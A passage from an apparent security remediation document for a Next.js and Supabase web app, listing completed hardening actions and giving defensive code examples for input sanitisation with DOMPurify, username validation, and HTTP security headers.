#### Short-term Actions (Medium Priority):
1. ✅ **Add rate limiting** on profile views and API calls
2. ✅ **Implement field whitelisting** for profile updates
3. ✅ **Add monitoring** for enumeration attempts
4. ✅ **Configure session timeout** in Supabase

#### Long-term Actions (Low Priority):
1. ✅ **Add CAPTCHA** for suspicious activity
2. ✅ **Implement user reporting** functionality
3. ✅ **Add admin moderation** tools
4. ✅ **Regular security audits**

---

### 15.5 Code Examples for Fixes

#### Example 1: Sanitize User Input
```typescript
// lib/sanitize.ts
import DOMPurify from 'dompurify';

export function sanitizeText(text: string): string {
  return DOMPurify.sanitize(text, {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: []
  });
}

export function sanitizeUrl(url: string): string {
  // Only allow http/https URLs
  if (!url.match(/^https?:\/\//)) {
    return '#';
  }
  return DOMPurify.sanitize(url);
}
```

#### Example 2: Validate Username from URL
```typescript
// app/[username]/page.tsx
const username = params?.username as string;

// Validate format
if (!username || !/^[a-zA-Z0-9_-]{3,30}$/.test(username)) {
  setNotFound(true);
  return;
}
```

#### Example 3: Add Security Headers
```javascript
// next.config.mjs
const nextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'X-Frame-Options',
            value: 'DENY'
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff'
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin'
          },
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-eval' 'unsafe-inline'",
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "connect-src 'self' https://*.supabase.co",
              "frame-ancestors 'none'"
            ].join('; ')
          }
        ]
      }
    ];
  }
};
```

---

*Last Updated: 2026-01-12*
*Version: 1.1*
